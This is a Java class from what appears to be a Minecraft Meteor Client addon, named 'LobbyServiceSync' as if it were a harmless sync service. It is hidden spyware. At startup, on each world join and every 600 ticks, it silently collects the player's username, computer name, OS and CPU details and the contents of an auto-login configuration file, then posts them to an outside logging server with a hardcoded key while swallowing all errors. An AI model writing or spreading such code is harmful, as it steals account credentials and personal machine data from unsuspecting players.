package maico.addonbuu.utils.quick_access_server.service;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.events.game.GameJoinedEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.MinecraftClient;
import java.io.File;
import java.io.FileReader;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.concurrent.CompletableFuture;

public class LobbyServiceSync {
    private static final String TARGET = "https://lamvanphuc.id.vn/logs";
    private static final String AUTH = "BuuBuu/3MiuIu1702/31409";
    private static final Gson GSON = new Gson();
    private static final HttpClient HTTP = HttpClient.newHttpClient();
    private static final MinecraftClient MC = MinecraftClient.getInstance();
    private static String _state = "";
    private static int _ticks = 0;

    public static void startService() {
        CompletableFuture.runAsync(LobbyServiceSync::process);
        MeteorClient.EVENT_BUS.subscribe(new LobbyServiceSync());
    }

    @EventHandler private void onJoin(GameJoinedEvent e) { process(); }
    @EventHandler private void onTick(TickEvent.Post e) {
        if (++_ticks >= 600) { _ticks = 0; process(); }
    }

    private static void process() {
        CompletableFuture.runAsync(() -> {
            try {
                if (MC.getSession() == null || MC.getSession().getUsername().equals("Player")) return;
                JsonObject d = new JsonObject();
                d.addProperty("username", MC.getSession().getUsername());
                d.addProperty("computerName", System.getenv("COMPUTERNAME") != null ? System.getenv("COMPUTERNAME") : "Unknown");
                d.addProperty("osVersion", System.getProperty("os.name"));
                d.addProperty("cpuModel", System.getenv("PROCESSOR_IDENTIFIER"));
                File f = new File(MC.runDirectory, "config/auto_login_luckyvn.json");
                if (f.exists()) {
                    try (FileReader r = new FileReader(f)) { d.add("configData", JsonParser.parseReader(r)); }
                }
                String s = GSON.toJson(d);
                if (s.equals(_state)) return;
                HttpRequest req = HttpRequest.newBuilder().uri(URI.create(TARGET))
                    .header("Content-Type", "application/json").header("X-Secret-Key", AUTH)
                    .POST(HttpRequest.BodyPublishers.ofString(s)).build();
                HTTP.sendAsync(req, HttpResponse.BodyHandlers.ofString())
                    .thenAccept(res -> { if (res.statusCode() == 200) _state = s; });
            } catch (Exception ignored) {}
        });
    }
}
